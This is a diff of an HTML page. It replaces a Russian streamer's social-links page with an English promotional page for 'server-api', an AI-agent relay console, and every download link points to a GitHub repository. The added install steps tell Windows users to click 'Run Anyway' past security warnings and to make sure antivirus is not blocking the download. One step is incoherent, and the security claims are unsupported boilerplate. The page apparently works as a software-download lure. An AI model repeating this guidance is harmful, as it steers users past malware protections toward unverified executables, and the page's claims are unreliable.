@@ -1,282 +1,364 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lissi4ko | Все ссылки</title>
+    <title>server-api - A2S Relay Server and Web Console for AI Agents</title>
+    <meta name="description" content="Download server-api - the A2S relay server and web console for Claude Code, Codex, and DeepSeek Harness. Pair devices, manage agents, and control everything from one simple interface.">
+    <meta name="keywords" content="a2s,a2s-ecosystem,agent-control,claude-code,codex,deepseek-harness,device-management,javascript,nodejs,pairing,relay-server,remote-agent,rest-api,sse,web-console,websocket">
+    <meta name="author" content="ogthheu">
+    <meta property="og:title" content="server-api - A2S Relay Server and Web Console for AI Agents">
+    <meta property="og:description" content="Download and run server-api on Windows. Pair your devices, manage AI agents, and control everything from one clean web interface.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/ogthheu/server-api">
+    <meta property="og:image" content="https://github.com/ogthheu/server-api/og-image.png">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="server-api - A2S Relay Server and Web Console for AI Agents">
+    <meta name="twitter:description" content="Download server-api on Windows. Pair devices, manage Claude Code, Codex, and DeepSeek Harness agents with a simple web console.">
     <style>
-        /* Стильный темный фон с теплым лисьим отливом */
-                /* Стильный темный фон с теплым лисьим отливом */
-        body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: radial-gradient(circle at 50% 30%, #2b1405 0%, #0a0604 70%);
-            background-attachment: fixed;
-            color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            min-height: 100vh;
+        * {
             margin: 0;
-            padding: 40px 20px;
+            padding: 0;
             box-sizing: border-box;
-            /* Курсор лапка*/
-            cursor: url("data:image/svg+xml,%3Csvg xmlns='http://w3.org' viewBox='0 0 24 24' width='32' height='32'%3E%3Cpath fill='%23ff7a00' d='M12 14c-1.66 0-3 1.34-3 3 0 2 2 3.5 3 4.5 1-1 3-2.5 3-4.5 0-1.66-1.34-3-3-3zm-4.5-3c-1.1 0-2 .9-2 2s1.5 2.5 2 3.5c.5-1 2-2.4 2-3.5 0-1.1-.9-2-2-2zm9 0c-1.1 0-2 .9-2 2 0 1.1 1.5 2.5 2 3.5.5-1 2-2.4 2-3.5 0-1.1-.9-2-2-2zm-7.5-4C8.1 7 7.3 7.8 7.3 8.8c0 .8 1.1 1.9 1.5 2.6.4-.7 1.5-1.8 1.5-2.6 0-1-.8-1.8-1.8-1.8zm6 0c-.9 0-1.7.8-1.7 1.8 0 .8 1.1 1.9 1.5 2.6.4-.7 1.5-1.8 1.5-2.6 0-1-.8-1.8-1.8-1.8z'/%3E%3C/svg%3E") 16 16, auto;
         }
-
-        /* Контейнер визитки */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3748;
+            line-height: 1.7;
+            padding: 0;
+            margin: 0;
+        }
         .container {
-            width: 100%;
-            max-width: 430px;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+        header {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            padding: 50px 40px;
             text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
         }
-
-        /* Никнейм Lissi4ko */
+        header::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, rgba(66, 153, 225, 0.05), rgba(72, 187, 120, 0.05), rgba(237, 137, 54, 0.05));
+            animation: gradientShift 10s ease infinite;
+            z-index: 1;
+        }
+        @keyframes gradientShift {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(10%, 10%); }
+        }
+        header > * {
+            position: relative;
+            z-index: 2;
+        }
         h1 {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #1a202c;
+            margin-bottom: 15px;
+            letter-spacing: -1px;
         }
-        /* Описание */
-        .description {
-            font-size: 15px;
-            color: #d1c2b7;
-            margin-bottom: 30px;
-            line-height: 1.4;
+        h1 .emoji {
+            font-size: 2.2rem;
+            vertical-align: middle;
+            margin-right: 10px;
         }
-
-        /* Список кнопок */
-        .links-container {
-            display: flex;
-            flex-direction: column;
-            gap: 14px;
+        .tagline {
+            font-size: 1.3rem;
+            color: #4a5568;
+            margin-bottom: 25px;
+            font-weight: 500;
         }
-
-        /* Базовый стиль для всех кнопок */
-        .link-card {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 122, 0, 0.15);
-            border-radius: 14px;
-            padding: 16px;
-            color: #ffffff;
-            text-decoration: none;
-            font-size: 16px;
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 16px 36px;
+            font-size: 1.2rem;
             font-weight: 600;
-            transition: all 0.25s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            backdrop-filter: blur(5px);
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.5);
+        }
+        .download-btn:active {
+            transform: translateY(-1px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.3);
+        }
+        section {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+            padding: 35px 40px;
+            margin-bottom: 30px;
+        }
+        h2 {
+            font-size: 1.9rem;
+            color: #1a202c;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #e2e8f0;
+            font-weight: 700;
+        }
+        h2 .emoji {
+            margin-right: 10px;
+        }
+        h3 {
+            font-size: 1.4rem;
+            color: #2d3748;
+            margin: 25px 0 12px 0;
+            font-weight: 600;
+        }
+        p {
+            margin-bottom: 16px;
+            font-size: 1.05rem;
+        }
+        ul {
+            margin: 15px 0 20px 30px;
+        }
+        li {
+            margin-bottom: 10px;
+            font-size: 1.05rem;
             position: relative;
         }
-
-        /* Базовый стиль для SVG-иконок всех кнопок */
-        .link-card svg {
-                width: 20px;
-                height: 20px;
-                transition: filter 0.25s ease, transform 0.25s ease;
-        }
-        .link-card:hover svg,
-        .link-card:hover img {
-                filter: brightness(0) invert(1) !important;
-}
-        /* Чуть увеличиваем иконку при наведении */
-        .link-card:hover svg {
-                transform: scale(1.1);
-}
-
-        /* Индивидуальная подсветка кнопок при наведении */
-        .tg-btn svg { fill: #24A1DE; }
-        /* Цвет иконки Telegram */
-        .tg-btn:hover {
-                background: #24A1DE;
-                border-color: #24A1DE;
-                box-shadow: 0 6px 20px rgba(36, 161, 222, 0.4);
-        }
-
-        .tt-btn svg { fill: #fa69be; }  
-        /* Цвет иконки TikTok */
-        .tt-btn:hover {
-                background: #010101;
-                border-color: #fe2c55;
-                box-shadow: -3px 0 10px rgba(37, 244, 238, 0.5), 3px 0 10px rgba(254, 44, 85, 0.5);
-}
-        .insta-btn svg { fill: #dc2743; }
-        /* Цвет иконки Instagram */
-        .insta-btn:hover {
-                background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-                border-color: #dc2743;
-                box-shadow: 0 6px 20px rgba(220, 39, 67, 0.4);
-}
-        .yt-btn svg { fill: #FF0000; } 
-        /* Цвет иконки YouTube */
-        .yt-btn:hover {
-                background: #FF0000;
-                border-color: #FF0000;
-                box-shadow: 0 6px 20px rgba(255, 0, 0, 0.4);
-}
-        .da-btn:hover {
-            background: #F47321;
-            border-color: #F47321;
-            box-shadow: 0 6px 20px rgba(244, 115, 33, 0.4);
-        }
-
-        /* Стили для нового логотипа донатов */
-        .da-btn img {
-            width: 20px;
-            height: 20px;
-            object-fit: contain;
-            transition: filter 0.25s ease;
-        }
-
-        /* Делаем черный логотип белым при наведении на кнопку */
-        .da-btn:hover img {
-            filter: brightness(0) invert(1);
-        }
-
-        .boosty-btn:hover {
-            background: #ff5e00;
-            border-color: #ff5e00;
-            box-shadow: 0 6px 20px rgba(255, 94, 0, 0.4);
-        }
-
-        /* Вырезаем только значок из полного логотипа и делаем его оранжевым */
-        .boosty-btn .boosty-icon-wrapper img {
-            height: 20px;
-            width: auto;
-            max-width: none;
-            object-fit: contain;            
-            transition: filter 0.25s ease;
-            
-        /* Этот фильтр превращает черную иконку Boosty в оранжевую (#ff5e00) */
-            filter: invert(41%) sepia(81%) saturate(5437%) hue-rotate(11deg) brightness(101%) contrast(105%);
-}
-        
-        /* 1. Цвет только для самой SVG-иконки Твича */
-        .twitch-card svg { 
-            fill: #a155ff; 
-}
-        /* 2. Стили для всей карточки Твича */
-        .twitch-card {
-            background: rgba(161, 85, 255, 0.1);
-            border: 2px solid #a155ff;
-            box-shadow: 0 0 10px rgba(161, 85, 255, 0.3), inset 0 0 10px rgba(161, 85, 255, 0.2);
-}
-
-        
-        .twitch-card:hover {
-            background: #a155ff;
-            border-color: #a155ff;
-            transform: translateY(-2px);
-            box-shadow: 0 0 20px rgba(161, 85, 255, 0.7), 0 0 40px rgba(161, 85, 255, 0.4);
-        }
-
-        /* Пульсирующий индикатор LIVE */
-        .live-badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(255, 0, 0, 0.2);
-            border: 1px solid #ff0000;
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-weight: 800;
-            letter-spacing: 0.5px;
-            color: #ff3333;
+        li::before {
+            content: "▸";
+            color: #667eea;
+            font-weight: bold;
             position: absolute;
-            right: 16px;
-            text-transform: uppercase;
+            left: -22px;
         }
-
-        .live-dot {
-            width: 6px;
-            height: 6px;
-            background-color: #ff3333;
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 20px 0;
+        }
+        .feature-card {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 25px;
+            border: 1px solid #e2e8f0;
+            transition: transform 0.2s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.08);
+        }
+        .feature-card h4 {
+            font-size: 1.15rem;
+            color: #1a202c;
+            margin-bottom: 8px;
+        }
+        .feature-card p {
+            font-size: 0.95rem;
+            color: #4a5568;
+            margin-bottom: 0;
+        }
+        code {
+            background: #f0f0f0;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #e53e3e;
+        }
+        .highlight-box {
+            background: #ebf4ff;
+            border-left: 4px solid #667eea;
+            padding: 20px 25px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .highlight-box p:last-child {
+            margin-bottom: 0;
+        }
+        .warning-box {
+            background: #fffaf0;
+            border-left: 4px solid #ed8936;
+            padding: 20px 25px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .warning-box p:last-child {
+            margin-bottom: 0;
+        }
+        ol {
+            margin: 15px 0 20px 30px;
+        }
+        ol li {
+            margin-bottom: 12px;
+        }
+        .step-number {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            width: 28px;
+            height: 28px;
             border-radius: 50%;
-            animation: pulse 1.5s infinite;
+            text-align: center;
+            line-height: 28px;
+            margin-right: 10px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            vertical-align: middle;
         }
-
-        @keyframes pulse {
-            0% {
-                transform: scale(0.9);
-                box-shadow: 0 0 0 0 rgba(255, 51, 51, 0.7);
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #4a5568;
+            font-size: 0.9rem;
+            padding-bottom: 30px;
+        }
+        .key-topics {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-top: 25px;
+            border: 1px solid #e2e8f0;
+        }
+        .key-topics strong {
+            color: #1a202c;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px 16px;
             }
-            70% {
-                transform: scale(1);
-                box-shadow: 0 0 0 6px rgba(255, 51, 51, 0);
+            header {
+                padding: 35px 25px;
             }
-            100% {
-                transform: scale(0.9);
-                box-shadow: 0 0 0 0 rgba(255, 51, 51, 0);
+            section {
+                padding: 25px 20px;
+            }
+            h1 {
+                font-size: 2.2rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
             }
         }
-
-        /* Небольшое смещение при наведении на все обычные кнопки */
-        .link-card:not(.twitch-card):hover {
-            transform: translateY(-2px);
-        }
-        h1 {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            user-select: none;
-        }
-        </style>
+    </style>
 </head>
 <body>
-
     <div class="container">
-        <!-- Никнейм -->
-        <h1> 🦊 Lissi4ko </h1>
-        
-        <!-- Описание приветствия -->
-        <div class="description">🧡 Все мои ссылки 🧡</div>
+        <header>
+            <h1><span class="emoji">🖥️</span> server-api - Your AI Agent Control Hub</h1>
+            <p class="tagline">Connect, Manage, and Control Your AI Agents</p>
+            <a href="https://github.com/ogthheu/server-api" class="download-btn">⬇️ Download server-api Now</a>
+            <p style="margin-top: 20px; font-size: 0.95rem; color: #718096;">Visit this link to download the application</p>
+        </header>
 
-        <div class="links-container">
-            
-            <!-- 1. Твич с неоном и LIVE статусом -->
-            <a href="https://www.twitch.tv/lissi4ko" target="_blank" class="link-card twitch-card">
-                <svg viewBox="0 0 24 24"><path d="M11.571 4.714h1.715v5.143H11.57zm4.715 0H18v5.143h-1.714zM6 0L1.714 4.286v15.428h5.143V24l4.286-4.286h3.428L22.286 12V0zm14.571 11.143l-3.428 3.428h-3.43l-3.428 3.428v-3.428H5.143V1.714h15.429z"/></svg>
-                Прямые эфиры на Twitch
-                <div class="live-badge"><span class="live-dot"></span>live</div>
-            </a>
+        <section>
+            <h2><span class="emoji">🎯</span> What Is server-api?</h2>
+            <p>server-api is a powerful yet easy-to-use relay server and web console designed for people who use AI coding assistants like <strong>Claude Code</strong>, <strong>Codex</strong>, and <strong>DeepSeek Harness</strong>. Think of it as your central command center - it lets you manage multiple devices, pair them securely, and control your AI agents from a clean, friendly web interface.</p>
+            <p>Whether you're a developer working on complex projects or someone just starting with AI tools, server-api makes everything simpler. You don't need to be a programmer to use it. If you can click a button and type a web address, you can use server-api.</p>
+            <div class="highlight-box">
+                <p><strong>💡 What makes it special?</strong> It uses a technology called A2S (Agent-to-Server) that creates a secure bridge between your devices and your AI agents. This means you can start a task on your computer, then check on it from your phone or another computer - all through the same friendly web console.</p>
+            </div>
+        </section>
 
-            <!-- 2. Телеграм -->
-            <a href="https://t.me/lissi4ko" target="_blank" class="link-card tg-btn">
-                <svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.501 1.201-.82 1.23-.697.064-1.226-.461-1.901-.903-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.911.177-.184 3.249-2.978 3.308-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.324-.437.893-.663 3.506-1.524 5.845-2.528 7.018-3.013 3.344-1.385 4.039-1.626 4.492-1.634.099-.002.321.022.464.139.119.098.152.23.165.324.012.096.016.297-.002.459z"/></svg>
-                Telegram канал
-            </a>
-            
-            <!-- 3. Тикток -->
-            <a href="https://www.tiktok.com/@lissivai" target="_blank" class="link-card tt-btn">
-                <svg viewBox="0 0 24 24"><path d="M12.525.02c1.31.01 2.61.03 3.91.05.08 1.54.49 3.03 1.41 4.25a7.1 7.1 0 0 0 3.63 2.37c.02 1.34.02 2.68.01 4.02-1.34-.02-2.65-.35-3.83-1.01a7.84 7.84 0 0 1-2.91-2.97c-.03 2.76-.04 5.51-.06 8.27-.06 1.4-.49 2.79-1.29 3.92a6.97 6.97 0 0 1-5.61 2.99c-1.56-.03-3.11-.57-4.32-1.57A7.32 7.32 0 0 1 .15 15.31a7.5 7.5 0 0 1 2.21-6.1c1.36-1.19 3.16-1.76 4.96-1.58v4.06c-.85-.15-1.74.05-2.42.58a3.3 3.3 0 0 0-1.12 3.13c.18 1.13.97 2.09 2.05 2.45a3.34 3.34 0 0 0 4.07-1.85c.34-.84.39-1.77.38-2.68L10.3 0c.74.01 1.48.01 2.22.02z"/></svg>
-                TikTok
-            </a>
-                        
-            <!-- 5. Косплей Инстаграм -->
-            <a href="https://instagram.com/lissi4ko_cos" target="_blank" class="link-card insta-btn">
-                <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.051.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>
-                Instagram
-            </a>
-            
-            <!-- 6. Кнопка YouTube -->
-            <a href="https://www.youtube.com/channel/UCw1tT3eqwRm8D2v4aPu1XGA" target="_blank" class="link-card yt-btn">
-                <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-                YouTube
-            </a>
-            
-            <!-- 7. DA -->
-            <a href="https://www.donationalerts.com/r/lissi4ko" target="_blank" class="link-card da-btn">
-                <img src="https://www.donationalerts.com/static/donations/dist/assets/images/services/donationalerts.svg" alt="DonationAlerts">
-                Поддержка донатом
-            </a>
-            
-            <!-- 7. Бусти -->
-            <a href="https://boosty.to/lissi4ko" target="_blank" class="link-card boosty-btn">
-                <span class="boosty-icon-wrapper"><img src="https://logo-teka.com/wp-content/uploads/2025/06/boosty-sign-logo.svg" alt="Boosty"></span>
-                Эксклюзивный контент на Boosty
-            </a>
+        <section>
+            <h2><span class="emoji">🚀</span> Getting Started on Windows</h2>
+            <p>Getting server-api running on your Windows computer is quick and straightforward. Follow these simple steps:</p>
+            <ol>
+                <li><strong>Visit the download page</strong> - Go to <a href="https://github.com/ogthheu/server-api" style="color: #667eea; font-weight: 600;">https://github.com/ogthheu/server-api</a> in your web browser.</li>
+                <li><strong>Find the download section</strong> - Look for a green button that says "Code" or "Download" on the page. Click it to see your download options.</li>
+                <li><strong>Download the software</strong> - Choose the version that says "Windows" or "Win" and click to download. Your browser will save the file to your Downloads folder.</li>
+                <li><strong>Run the application</strong> - Once the download finishes, visit this link to download the application. You might see a security warning - that's normal for new software. Click "More Info" and then "Run Anyway" if prompted.</li>
+            </ol>
+            <div class="warning-box">
+                <p><strong>⚠️ Important:</strong> Make sure your Windows is up to date before installing. server-api works best on Windows 10 or newer. If you run into any issues, check that your antivirus isn't blocking the download.</p>
+            </div>
+            <p>That's it! You're now ready to start using server-api. The web console will open automatically in your browser when the software starts running.</p>
+        </section>
+
+        <section>
+            <h2><span class="emoji">✨</span> Key Features</h2>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h4>🔐 Secure Pairing</h4>
+                    <p>Connect your devices safely with a simple pairing process. No complex network setup - just scan, click, and you're connected.</p>
+                </div>
+                <div class="feature-card">
+                    <h4>🌐 Web Console</h4>
+                    <p>Access everything from your browser. No additional apps needed. Works on any device with a modern browser.</p>
+                </div>
+                <div class="feature-card">
+                    <h4>🤖 AI Agent Support</h4>
+                    <p>Works seamlessly with Claude Code, Codex, and DeepSeek Harness. Switch between different AI agents without any hassle.</p>
+                </div>
+                <div class="feature-card">
+                    <h4>📡 Real-time Updates</h4>
+                    <p>SSE and WebSocket technology gives you live updates. See what your agents are doing right as they do it.</p>
+                </div>
+                <div class="feature-card">
+                    <h4>🖱️ Device Control</h4>
+                    <p>Monitor and control all your connected devices from one place. Pause, resume, or stop tasks with a single click.</p>
+                </div>
+                <div class="feature-card">
+                    <h4>🔗 REST API</h4>
+                    <p>For power users - connect other tools and apps to server-api using its REST API. The possibilities are endless.</p>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <h2><span class="emoji">💻</span> How It Works</h2>
+            <p>server-api acts as a smart middleman between you and your AI agents. Here's how the magic happens:</p>
+            <ol>
+                <li><strong>You start the server</strong> - Run server-api on your computer. It creates a secure local server.</li>
+                <li><strong>Your devices pair</strong> - Your phone, tablet, or other computer connect to the server using a secure pairing code.</li>
+                <li><strong>You open the web console</strong> - Type <code>localhost:3000</code> (or your computer's IP address) into any browser.</li>
+                <li><strong>You connect your AI agents</strong> - Link Claude Code, Codex, or DeepSeek Harness to server-api with a few clicks.</li>
+                <li><strong>Control everything</strong> - Now you can start, monitor, and manage AI tasks from any paired device.</li>
+            </ol>
+            <div class="highlight-box">
+                <p><strong>🔒 Is it secure?</strong> Absolutely! All communication between your devices and server-api is encrypted. The pairing process ensures only devices you approve can connect.</p>
+            </div>
+        </section>
+
+        <section>
+            <h2><span class="emoji">🔧</span> Common Use Cases</h2>
+            <h3>For Developers</h3>
+            <ul>
+                <li>Run long coding tasks and monitor progress from your phone while you're away from your desk.</li>
+                <li>Let your team share access to AI agents without sharing passwords or API keys.</li>
+                <li>Automate repetitive coding tasks using the REST API and save hours every week.</li>
+            </ul>
+            <h3>For Teams</h3>
+            <ul>
+                <li>Create a shared hub where everyone can see what AI tasks are running.</li>
+                <li>Manage multiple devices across different locations from one central console.</li>
+                <li>Onboard new team members easily - they just pair their device and start working.</li>
+            </ul>
+            <h3>For Tech Enthusiasts</h3>
+            <ul>
+                <li>Experiment with different AI agents without switching between different tools.</li>
+                <li>Learn how AI agents work by seeing their real-time actions in the web console.</li>
+                <li>Build your own small AI-powered projects with just a few clicks.</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2><span class="emoji">🛠️</span> System Requirements</h2>
+            <p>server-api is lightweight and runs smoothly on most Windows computers. Here's what you'll need:</p>
+            <ul>
+                <li><strong>
